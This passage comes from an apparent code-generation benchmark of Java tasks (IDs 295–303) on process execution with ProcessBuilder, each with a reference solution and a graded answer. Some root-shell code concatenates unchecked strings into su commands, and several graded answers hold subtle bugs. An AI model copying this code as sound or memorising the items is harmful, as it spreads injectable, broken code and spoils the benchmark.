ProcessOutputHandler {\n        void handleOutput(String output);\n        void handleCompletion(int exitCode);\n        void handleError(String errorMessage);\n    }\n}\n```"
  },
  {
    "Task_id": 295,
    "Instruction": "Task Description: The task involves creating utility functions for executing system commands and retrieving information about the Magisk tool using Java's ProcessBuilder for inter-process communication.\n\nFunction Description: The provided code consists of three utility functions that work with system processes to execute commands and retrieve Magisk-related information. These functions demonstrate proper process handling, stream management, and error handling in Java.\n\nMethods:\n\nMethod1: exec(String... command) -> void - Executes a system command using ProcessBuilder. Takes a variable number of strings representing the command and its arguments. Logs the exit code or any errors encountered during execution.\n\nMethod2: getMagiskVersionCode() -> int - Retrieves the version code of Magisk by executing 'magisk -V' command. Returns the version code as an integer, or -1 if an error occurs. Caches the result for subsequent calls.\n\nMethod3: getMagiskTmpfsPath() -> String - Retrieves the tmpfs path used by Magisk by executing 'magisk --path' command. Returns the path as a string, or an empty string if an error occurs. Checks Magisk version first and returns '/sbin' for older versions (<21000). Caches the result for subsequent calls.\n\nAttributes:\nmagiskVersionCode: int - Caches the Magisk version code to avoid repeated process execution\nmagiskTmpfsPath: String - Caches the Magisk tmpfs path to avoid repeated process execution",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.Executors;\n\npublic static void exec(String... command) {\n    ProcessBuilder pb = new ProcessBuilder(command);\n    try {\n        Process process = pb.start();\n        int code = process.waitFor();\n        Log.i(TAG, \"Exec \" + command[0] + \" exited with \" + code);\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec \" + command[0], e);\n    }\n}\n\npublic static int getMagiskVersionCode() {\n    if (magiskVersionCode != -1) {\n        return magiskVersionCode;\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"-V\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        String line = in.readLine();\n        Log.i(TAG, \"Exec magisk -V: \" + line);\n        magiskVersionCode = Integer.parseInt(line);\n        pr.waitFor();\n        in.close();\n        return magiskVersionCode;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk -V\", e);\n        return -1;\n    }\n}\n\npublic static String getMagiskTmpfsPath() {\n    if (magiskTmpfsPath != null) {\n        return magiskTmpfsPath;\n    }\n\n    if (getMagiskVersionCode() < 21000) {\n        return \"/sbin\";\n    }\n\n    try {\n        ProcessBuilder ps = new ProcessBuilder(\"magisk\", \"--path\");\n        ps.redirectErrorStream(true);\n        Process pr = ps.start();\n\n        BufferedReader in = new BufferedReader(new InputStreamReader(pr.getInputStream()));\n        magiskTmpfsPath = in.readLine();\n        Log.i(TAG, \"Exec magisk --path: \" + magiskTmpfsPath);\n        pr.waitFor();\n        in.close();\n        return magiskTmpfsPath;\n    } catch (Throwable e) {\n        Log.w(TAG, \"Exec magisk --path\", e);\n        return \"\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class MagiskUtils {\n    private static int magiskVersionCode = -1;\n    private static String magiskTmpfsPath = \"\";\n\n    public static void exec(String... command) {\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(command);\n            processBuilder.inheritIO();\n            Process process = processBuilder.start();\n            int exitCode = process.waitFor();\n            System.out.println(\"Command executed with exit code: \" + exitCode);\n        } catch (IOException | InterruptedException e) {\n            System.err.println(\"Error executing command: \" + e.getMessage());\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public static int getMagiskVersionCode() {\n        if (magiskVersionCode != -1) {\n            return magiskVersionCode;\n        }\n\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(\"magisk\", \"-V\");\n            Process process = processBuilder.start();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                if (line.startsWith(\"VersionCode:\")) {\n                    String[] parts = line.split(\":\\\\s*\");\n                    if (parts.length > 1) {\n                        magiskVersionCode = Integer.parseInt(parts[1].trim());\n                        break;\n                    }\n                }\n            }\n\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                magiskVersionCode = -1;\n            }\n        } catch (IOException | NumberFormatException | InterruptedException e) {\n            magiskVersionCode = -1;\n            Thread.currentThread().interrupt();\n        }\n\n        return magiskVersionCode;\n    }\n\n    public static String getMagiskTmpfsPath() {\n        if (!magiskTmpfsPath.isEmpty()) {\n            return magiskTmpfsPath;\n        }\n\n        int versionCode = getMagiskVersionCode();\n        if (versionCode < 21000) {\n            magiskTmpfsPath = \"/sbin\";\n            return magiskTmpfsPath;\n        }\n\n        try {\n            ProcessBuilder processBuilder = new ProcessBuilder(\"magisk\", \"--path\");\n            Process process = processBuilder.start();\n\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line = reader.readLine();\n            int exitCode = process.waitFor();\n\n            if (exitCode == 0 && line != null) {\n                magiskTmpfsPath = line.trim();\n            } else {\n                magiskTmpfsPath = \"\";\n            }\n        } catch (IOException | InterruptedException e) {\n            magiskTmpfsPath = \"\";\n            Thread.currentThread().interrupt();\n        }\n\n        return magiskTmpfsPath;\n    }\n}\n```"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes an external diff tool to compare two files and generate a difference file, while capturing and logging the tool's output.\n\nFunction Description: The function `diffFile` executes an external diff utility specified by its path and arguments, comparing two input files (old and new versions) and generating a difference file. It captures the standard output and error streams of the external process, logs them, and waits for the process to complete before returning.\n\nInput:\n- `mCustomDiffPath`: String - Path to the external diff tool executable\n- `mCustomDiffPathArgs`: String - Arguments to pass to the diff tool (space-separated)\n- `oldFile`: File - The original file to compare against\n- `newFile`: File - The modified file to compare\n- `diffFile`: File - The output file where differences will be written\n\nOutput:\n- None (void) - The function doesn't return any value but writes the diff output to the specified file and logs the process output\n- Throws IOException if process execution fails\n- Throws InterruptedException if the process is interrupted while waiting",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic static void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException {\n    String outPath = diffFile.getAbsolutePath();\n    String cmd = mCustomDiffPath;\n    List<String> cmds = new ArrayList<>();\n    for (String s : cmd.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    for (String s : mCustomDiffPathArgs.split(\" \")) {\n        if (!s.isEmpty()) {\n            cmds.add(s);\n        }\n    }\n    cmds.add(oldFile.getAbsolutePath());\n    cmds.add(newFile.getAbsolutePath());\n    cmds.add(outPath);\n\n    ProcessBuilder pb = new ProcessBuilder(cmds);\n    pb.redirectErrorStream(true);\n    Process process = pb.start();\n    BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()));\n    String line;\n    while ((line = br.readLine()) != null) {\n        Logger.d(line);\n    }\n    int exitCode = process.waitFor();\n    process.destroy();\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.logging.Logger;\n\npublic class DiffExecutor {\n    private static final Logger logger = Logger.getLogger(DiffExecutor.class.getName());\n\n    public void diffFile(String mCustomDiffPath, String mCustomDiffPathArgs, File oldFile, File newFile, File diffFile) throws IOException, InterruptedException {\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        processBuilder.command(mCustomDiffPath, mCustomDiffPathArgs, oldFile.getAbsolutePath(), newFile.getAbsolutePath());\n        processBuilder.redirectOutput(diffFile);\n        \n        Process process = processBuilder.start();\n\n        try (BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));\n             BufferedReader stdError = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n            String s;\n            while ((s = stdInput.readLine()) != null) {\n                logger.info(s);\n            }\n            while ((s = stdError.readLine()) != null) {\n                logger.severe(s);\n            }\n        }\n\n        int exitCode = process.waitFor();\n        if (exitCode != 0) {\n            throw new IOException(\"Diff tool exited with error code: \" + exitCode);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a Java class that executes external processes, handles their output streams, and provides a way to interact with the process execution through callback methods.\n\nClass Description: The ProcessExecutor class is designed to manage external process execution in a cross-platform manner (handling Windows and Unix-like systems differently). It provides methods to start processes, redirect their output streams, and handle both standard output and error streams through a handler interface.\n\nAttributes:\n- process: Process - Represents the currently running external process\n- processBuilder: ProcessBuilder - Used to configure and start external processes\n\nMethods:\n- execRedirected: static Process(String[] command) throws IOException - Configures and starts an external process with error stream redirected to standard output. Handles Windows-specific command formatting.\n  - Input: String[] command - The command and arguments to execute\n  - Output: Process - The started process instance\n\n- listenOnProcess: int(String[] arguments, ProcessOutputHandler handler) - Executes a command and listens to its output streams, forwarding output lines and errors to the handler.\n  - Input: \n    - String[] arguments - The command and arguments to execute\n    - ProcessOutputHandler handler - Callback interface for handling output and errors\n  - Output: int - The exit value of the process (-1 if execution failed)\n\n- ProcessOutputHandler: interface - Callback interface for handling process output and errors\n  - Methods:\n    - handleOutputLine: void(String line) - Called for each line of output from the process\n    - handleError: void(String errorMessage) - Called when an error occurs during process execution",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.util.Map;\n\npublic class ProcessExecutor {\n\n    private Process process;\n    private ProcessBuilder processBuilder;\n\n    public static Process execRedirected(String[] command) throws IOException {\n        ProcessBuilder pb;\n\n        if (!OSUtils.isWindows()) {\n            pb = new ProcessBuilder(command);\n        } else {\n            String[] cmdLine = new String[command.length];\n            for (int i = 0; i < command.length; i++)\n                cmdLine[i] = command[i].replace(\"\\\"\", \"\\\\\\\"\");\n            pb = new ProcessBuilder(cmdLine);\n            Map<String, String> env = pb.environment();\n            env.put(\"CYGWIN\", \"nodosfilewarning\");\n        }\n        pb.redirectErrorStream(true);\n\n        return pb.start();\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        try {\n            final Process p = execRedirected(arguments);\n            Thread thread = new Thread() {\n                public void run() {\n                    try {\n                        InputStreamReader reader = new InputStreamReader(p.getInputStream());\n                        int c;\n                        String line = \"\";\n                        while ((c = reader.read()) != -1) {\n                            if ((char) c == '\\r')\n                                continue;\n                            if ((char) c == '\\n') {\n                                handler.handleOutputLine(line);\n                                line = \"\";\n                            } else {\n                                line += (char) c;\n                            }\n                        }\n                        handler.handleOutputLine(line);\n                        reader.close();\n\n                        reader = new InputStreamReader(p.getErrorStream());\n                        while ((c = reader.read()) != -1)\n                            System.err.print((char) c);\n                        reader.close();\n                    } catch (Exception e) {\n                        handler.handleError(\"Run Exception: \" + e.getMessage());\n                    }\n                }\n            };\n            thread.start();\n            int res = p.waitFor();\n            thread.join();\n            return res;\n        } catch (Exception e) {\n            handler.handleError(\"Process Exception: \" + e.getMessage());\n        }\n        return -1;\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.*;\nimport java.util.*;\n\npublic class ProcessExecutor {\n    private Process process;\n    private ProcessBuilder processBuilder;\n\n    public static Process execRedirected(String[] command) throws IOException {\n        List<String> cmdList = new ArrayList<>();\n        if (File.separatorChar == '\\\\') {\n            cmdList.add(\"cmd.exe\");\n            cmdList.add(\"/c\");\n            for (String s : command) {\n                cmdList.add(s);\n            }\n        } else {\n            cmdList.addAll(Arrays.asList(command));\n        }\n        ProcessBuilder pb = new ProcessBuilder(cmdList);\n        pb.redirectErrorStream(true);\n        return pb.start();\n    }\n\n    public int listenOnProcess(String[] arguments, ProcessOutputHandler handler) {\n        try {\n            processBuilder = new ProcessBuilder(arguments);\n            process = processBuilder.start();\n\n            Thread outputThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        handler.handleOutputLine(line);\n                    }\n                } catch (IOException e) {\n                    handler.handleError(\"Error reading standard output: \" + e.getMessage());\n                }\n            });\n\n            Thread errorThread = new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        handler.handleError(\"Error stream: \" + line);\n                    }\n                } catch (IOException e) {\n                    handler.handleError(\"Error reading error stream: \" + e.getMessage());\n                }\n            });\n\n            outputThread.start();\n            errorThread.start();\n\n            outputThread.join();\n            errorThread.join();\n\n            return process.waitFor();\n        } catch (IOException | InterruptedException e) {\n            handler.handleError(\"Process execution failed: \" + e.getMessage());\n            return -1;\n        }\n    }\n\n    public interface ProcessOutputHandler {\n        void handleOutputLine(String line);\n        void handleError(String errorMessage);\n    }\n}\n```"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Create a Java function that disassembles a Java class file using the `javap` command-line tool and returns the disassembled output as a string.\n\nFunction Description: The function `disassembleClassFromJava` takes a Java class file as input, executes the `javap -c` command on it to disassemble the bytecode, and returns the disassembled output as a string. It handles the process execution, stream management, and error handling.\n\nInput: \n- `resourceFile` (String): The path or name of the Java class file to be disassembled.\n\nOutput: \n- (String): The disassembled bytecode output from the `javap` command. If an error occurs, returns an error message string.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.StringWriter;\nimport java.net.URL;\n\npublic String disassembleClassFromJava(String resourceFile) {\n    try {\n        ProcessBuilder pb = new ProcessBuilder(\"javap\", \"-c\", resourceFile)\n                .redirectErrorStream(true);\n\n        final Process process = pb.start();\n        final StringWriter writer = new StringWriter();\n        new Thread(() -> IOUtils.copyStreamNoException(process.getInputStream(), writer)).start();\n\n        final int ignored = process.waitFor();\n        final String processOutput = writer.toString();\n        return processOutput;\n    } catch (InterruptedException e) {\n        Thread.currentThread().interrupt();\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    } catch (IOException e) {\n        return \"Unable to run javap command (\" + e.getMessage() + \").\";\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class Disassembler {\n    public static String disassembleClassFromJava(String resourceFile) {\n        StringBuilder output = new StringBuilder();\n        ProcessBuilder processBuilder = new ProcessBuilder(\"javap\", \"-c\", resourceFile);\n        processBuilder.redirectErrorStream(true);\n\n        try {\n            Process process = processBuilder.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n\n            while ((line = reader.readLine()) != null) {\n                output.append(line).append(\"\\n\");\n            }\n\n            int exitCode = process.waitFor();\n            if (exitCode != 0) {\n                return \"Error: javap exited with code \" + exitCode;\n            }\n        } catch (IOException | InterruptedException e) {\n            return \"Error: \" + e.getMessage();\n        }\n\n        return output.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 302,
    "Instruction": "Task Description: Create a Java class that handles process execution, logging, and management, with support for both regular and root-level execution on Android systems.\n\nClass Description: ProcessHandler is a utility class designed to manage external process execution in Android applications. It provides functionality to launch processes (with optional root privileges), capture and log their output, and retrieve process information. The class handles environment variables, stream management, and maintains a wake lock during process execution to prevent CPU sleep.\n\nAttributes:\n- mContext: [Context] - Android application context used for system services\n- mUseRoot: [boolean] - Flag indicating whether root privileges should be used\n- mPreferences: [SharedPreferences] - Shared preferences for configuration\n\nMethods:\n- setupAndLaunch([HashMap<String, String> env, String[] command]) -> [Process] - Configures and starts a process with the given environment variables and command, supporting both regular and root execution\n- log([InputStream is, int priority]) -> [Thread] - Starts a thread to continuously read and log input from the given stream at the specified log priority\n- runProcess([ProcessBuilder pb, boolean returnStdOut]) -> [String] - Executes a process, optionally capturing its standard output, while maintaining a wake lock and logging output\n- getProcessPIDs([String processName]) -> [List<String>] - Returns a list of process IDs matching the given process name, supporting both regular and root-level process listing",
    "Canonical_solution": "import android.annotation.SuppressLint;\nimport android.content.Context;\nimport android.os.PowerManager;\nimport android.util.Log;\n\nimport com.google.common.base.Charsets;\nimport com.nutomic.syncthingandroid.service.Constants;\nimport com.nutomic.syncthingandroid.util.Util;\n\nimport java.io.BufferedReader;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\nimport javax.inject.Inject;\n\nimport eu.chainfire.libsuperuser.Shell;\n\npublic class ProcessHandler {\n\n    private static final String TAG = \"ProcessHandler\";\n    private final Context mContext;\n    private final boolean mUseRoot;\n    @Inject SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context) {\n        mContext = context;\n        mUseRoot = mPreferences.getBoolean(Constants.PREF_USE_ROOT, false) && Shell.SU.available();\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) throws IOException {\n        if (mUseRoot) {\n            ProcessBuilder pb = new ProcessBuilder(\"su\");\n            Process process = pb.start();\n            DataOutputStream suOut = new DataOutputStream(process.getOutputStream());\n            for (Map.Entry<String, String> entry : env.entrySet()) {\n                suOut.writeBytes(String.format(\"export %s=\\\"%s\\\"\\n\", entry.getKey(), entry.getValue()));\n            }\n            suOut.flush();\n            suOut.writeBytes(\"exec \" + TextUtils.join(\" \", command) + \"\\n\");\n            suOut.flush();\n            return process;\n        } else {\n            ProcessBuilder pb = new ProcessBuilder(command);\n            pb.environment().putAll(env);\n            return pb.start();\n        }\n    }\n\n    public Thread log(final InputStream is, final int priority) {\n        Thread t = new Thread(() -> {\n            BufferedReader br = null;\n            try {\n                br = new BufferedReader(new InputStreamReader(is, Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(priority, TAG, line);\n                }\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to read process output\", e);\n            } finally {\n                if (br != null) {\n                    try {\n                        br.close();\n                    } catch (IOException e) {\n                        Log.w(TAG, \"Failed to close bufferedReader\", e);\n                    }\n                }\n            }\n        });\n        t.start();\n        return t;\n    }\n\n    @SuppressLint(\"WakelockTimeout\")\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) {\n        String capturedStdOut = \"\";\n        PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, TAG);\n        try {\n            wakeLock.acquire();\n            Process process = pb.start();\n\n            Thread lInfo = null;\n            Thread lWarn = null;\n            if (returnStdOut) {\n                BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream(), Charsets.UTF_8));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    Log.println(Log.INFO, TAG, line);\n                    capturedStdOut = capturedStdOut + line + \"\\n\";\n                }\n                br.close();\n            } else {\n                lInfo = log(process.getInputStream(), Log.INFO);\n                lWarn = log(process.getErrorStream(), Log.WARN);\n            }\n\n            int ret = process.waitFor();\n            Log.i(TAG, \"Process exited with code \" + ret);\n            if (lInfo != null) lInfo.join();\n            if (lWarn != null) lWarn.join();\n        } catch (IOException | InterruptedException e) {\n            Log.e(TAG, \"Failed to execute process or read output\", e);\n        } finally {\n            wakeLock.release();\n        }\n        return capturedStdOut;\n    }\n\n    public List<String> getProcessPIDs(String processName) {\n        List<String> pids = new ArrayList<>();\n        Process ps = null;\n        DataOutputStream psOut = null;\n        BufferedReader br = null;\n        try {\n            ps = Runtime.getRuntime().exec((mUseRoot) ? \"su\" : \"sh\");\n            psOut = new DataOutputStream(ps.getOutputStream());\n            psOut.writeBytes(\"ps\\n\");\n            psOut.writeBytes(\"exit\\n\");\n            psOut.flush();\n            ps.waitFor();\n            br = new BufferedReader(new InputStreamReader(ps.getInputStream(), \"UTF-8\"));\n            String line;\n            while ((line = br.readLine()) != null) {\n                if (line.contains(processName)) {\n                    String pid = line.trim().split(\"\\\\s+\")[1];\n                    Log.v(TAG, \"getProcessPIDs: Found process PID [\" + pid + \"]\");\n                    pids.add(pid);\n                }\n            }\n        } catch (IOException | InterruptedException e) {\n            Log.w(TAG, \"Failed to list processes\", e);\n        } finally {\n            try {\n                if (br != null) br.close();\n                if (psOut != null) psOut.close();\n            } catch (IOException e) {\n                Log.w(TAG, \"Failed to close streams\", e);\n            }\n            if (ps != null) ps.destroy();\n        }\n        return pids;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport android.content.Context;\nimport android.content.SharedPreferences;\nimport android.os.PowerManager;\n\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class ProcessHandler {\n    private Context mContext;\n    private boolean mUseRoot;\n    private SharedPreferences mPreferences;\n\n    public ProcessHandler(Context context, boolean useRoot) {\n        this.mContext = context;\n        this.mUseRoot = useRoot;\n        this.mPreferences = context.getSharedPreferences(\"ProcessHandlerPrefs\", Context.MODE_PRIVATE);\n    }\n\n    public Process setupAndLaunch(HashMap<String, String> env, String[] command) throws Exception {\n        ProcessBuilder pb = new ProcessBuilder(command);\n        if (env != null) {\n            Map<String, String> environment = pb.environment();\n            environment.putAll(env);\n        }\n        if (mUseRoot) {\n            return Runtime.getRuntime().exec(\"su\");\n        } else {\n            return pb.start();\n        }\n    }\n\n    public Thread log(InputStream is, int priority) {\n        return new Thread(() -> {\n            try (BufferedReader reader = new BufferedReader(new InputStreamReader(is))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    android.util.Log.println(priority, \"ProcessHandler\", line);\n                }\n            } catch (Exception e) {\n                android.util.Log.e(\"ProcessHandler\", \"Error logging stream\", e);\n            }\n        });\n    }\n\n    public String runProcess(ProcessBuilder pb, boolean returnStdOut) {\n        PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);\n        PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, \"ProcessHandler:WakeLock\");\n        wakeLock.acquire();\n\n        String result = \"\";\n        try {\n            Process process = pb.start();\n            InputStream inputStream = process.getInputStream();\n            InputStream errorStream = process.getErrorStream();\n\n            Thread outThread = log(inputStream, android.util.Log.INFO);\n            Thread errThread = log(errorStream, android.util.Log.ERROR);\n\n            outThread.start();\n            errThread.start();\n\n            int exitCode = process.waitFor();\n            outThread.join();\n            errThread.join();\n\n            if (exitCode == 0) {\n                android.util.Log.i(\"ProcessHandler\", \"Process completed successfully.\");\n            } else {\n                android.util.Log.w(\"ProcessHandler\", \"Process exited with code: \" + exitCode);\n            }\n\n            if (returnStdOut) {\n                StringBuilder sb = new StringBuilder();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    sb.append(line).append(\"\\n\");\n                }\n                result = sb.toString();\n            }\n\n        } catch (Exception e) {\n            android.util.Log.e(\"ProcessHandler\", \"Error running process\", e);\n        } finally {\n            if (wakeLock.isHeld()) {\n                wakeLock.release();\n            }\n        }\n        return result;\n    }\n\n    public List<String> getProcessPIDs(String processName) {\n        List<String> pids = new ArrayList<>();\n        try {\n            ProcessBuilder pb;\n            if (mUseRoot) {\n                pb = new ProcessBuilder(\"su\", \"-c\", \"ps | grep \" + processName);\n            } else {\n                pb = new ProcessBuilder(\"ps\", \"|\", \"grep\", processName);\n            }\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                String[] parts = line.trim().split(\"\\\\s+\");\n                if (parts.length > 1 && !parts[1].equals(\"PID\")) {\n                    pids.add(parts[1]);\n                }\n            }\n        } catch (Exception e) {\n            android.util.Log.e(\"ProcessHandler\", \"Error retrieving PIDs\", e);\n        }\n        return pids;\n    }\n}\n```"
  },
  {
    "Task_id": 303,
    "Instruction": "Task Description: Create a Java class that manages the execution of external commands, handles their input/output streams, and provides synchronization capabilities for waiting until the command completes.\n\nClass Description: The ExtCmd class provides functionality to execute external system commands, manage their input/output streams, and wait for their completion. It includes features for logging, condition checking before execution, and notification listeners for process completion.\n\nAttributes:\n\nconditionsWithDescriptions: Map<ExtCmdCondition, String> - Stores conditions that must be met before command execution along with their descriptions\nextCmdEndedListenerSet: Set<ExtCmdEndedListener> - Collection of listeners to be notified when command execution ends\noutReceiver: OutputReceiver - Handles the standard output stream from the executed command\nerrReceiver: OutputReceiver - Handles the error output stream from the executed command\nerrLog: ErrorReporter - Logger for command execution information\nstartTime: long - Timestamp when command execution started\nexecCommand: String[] - The command to be executed\nexecCommandStr: String - String representation of the command\nlogExecution: boolean - Flag to enable/disable execution logging\n\nMethods:\n\nexec(ProcessBuilder.Redirect, File, String...) -> OutputStream - Executes an external command with specified input redirection, working directory, and command arguments. Returns the process's output stream for writing input.\nsyncProcess() -> OutputData - Waits for the command to complete and returns its output data including stdout, stderr, and exit code.\ncheckForConditions() -> void - Internal method to verify all execution conditions are met before starting a command.\n\nNested Classes:\n\nOutputData: Contains the results of command execution including stdout, stderr, and exit code\nExtCmdCondition: Interface for defining pre-execution conditions\nExtCmdEndedListener: Interface for command completion notification callbacks",
    "Canonical_solution": "import com.linbit.ChildProcessTimeoutException;\nimport com.linbit.linstor.logging.ErrorReporter;\nimport com.linbit.timer.Action;\nimport com.linbit.timer.Timer;\nimport com.linbit.utils.StringUtils;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.HashMap;\nimport java.util.HashSet;\nimport java.util.Map;\nimport java.util.Map.Entry;\nimport java.util.Set;\n\nimport org.slf4j.MDC;\n\npublic class ExtCmd extends ChildProcessHandler\n{\n    private final Map<ExtCmdCondition, String> conditionsWithDescriptions;\n    private final Set<ExtCmdEndedListener> extCmdEndedListenerSet;\n\n    private OutputReceiver outReceiver;\n    private OutputReceiver errReceiver;\n    private ErrorReporter errLog;\n    private long startTime;\n\n    private String[] execCommand;\n    private String execCommandStr;\n\n    private boolean logExecution = true;\n\n    public ExtCmd(Timer<String, Action<String>> timer, ErrorReporter errLogRef)\n    {\n        super(timer);\n        conditionsWithDescriptions = new HashMap<>();\n        outReceiver = null;\n        errReceiver = null;\n        errLog = errLogRef;\n        extCmdEndedListenerSet = new HashSet<>();\n    }\n\n    public OutputStream exec(ProcessBuilder.Redirect stdinRedirect, File directory, String... command)\n        throws IOException\n    {\n        execCommand = command;\n        execCommandStr = StringUtils.joinShellQuote(command);\n\n        if (logExecution)\n        {\n            errLog.logDebug(\"Executing command: %s\", execCommandStr);\n        }\n\n        ProcessBuilder pBuilder = new ProcessBuilder();\n        pBuilder.directory(directory);\n        pBuilder.command(command);\n        pBuilder.redirectError(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectOutput(ProcessBuilder.Redirect.PIPE);\n        pBuilder.redirectInput(stdinRedirect);\n        Process child;\n        synchronized (conditionsWithDescriptions)\n        {\n            checkForConditions();\n            child = pBuilder.start();\n            startTime = System.currentTimeMillis();\n            setChild(child);\n            outReceiver = new OutputReceiver(\n                child.getInputStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n            errReceiver = new OutputReceiver(\n                child.getErrorStream(), errLog, logExecution, MDC.get(ErrorReporter.LOGID));\n        }\n        new Thread(outReceiver).start();\n        new Thread(errReceiver).start();\n\n        return child.getOutputStream();\n    }\n\n    private void checkForConditions()\n    {\n        for (Entry<ExtCmdCondition, String> entry : conditionsWithDescriptions.entrySet())\n        {\n            if (!entry.getKey().isMet(this))\n            {\n                throw new ExtCmdConditionNotFullfilledException(entry.getValue() + \", command: \" + this.execCommandStr);\n            }\n        }\n    }\n\n    public OutputData syncProcess() throws IOException, ChildProcessTimeoutException\n    {\n        OutputData outData;\n        try\n        {\n            int exitCode = waitFor();\n            outReceiver.finish();\n            errReceiver.finish();\n            outData = new OutputData(\n                execCommand,\n                outReceiver.getData(),\n                errReceiver.getData(),\n                exitCode\n            );\n\n            if (logExecution)\n            {\n                errLog.logTrace(\n                    \"External command finished in %dms: %s\",\n                    (System.currentTimeMillis() - startTime),\n                    execCommandStr\n                );\n            }\n\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this);\n            }\n        }\n        catch (IOException | ChildProcessTimeoutException exc)\n        {\n            for (ExtCmdEndedListener listener : extCmdEndedListenerSet)\n            {\n                listener.extCmdEnded(this, exc);\n            }\n            throw exc;\n        }\n        return outData;\n    }\n\n    public static class OutputData\n    {\n        public final String[] executedCommand;\n        public final byte[] stdoutData;\n        public final byte[] stderrData;\n        public final int exitCode;\n\n        public OutputData(String[] executeCmd, byte[] out, byte[] err, int retCode)\n        {\n            executedCommand = executeCmd;\n            stdoutData = out;\n            stderrData = err;\n            exitCode = retCode;\n        }\n    }\n\n    public interface ExtCmdCondition\n    {\n        boolean isMet(ExtCmd extCmd);\n    }\n\n    public interface ExtCmdEndedListener\n    {\n        void extCmdEnded(ExtCmd extCmd);\n        void extCmdEnded(ExtCmd extCmd, Exception exc);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
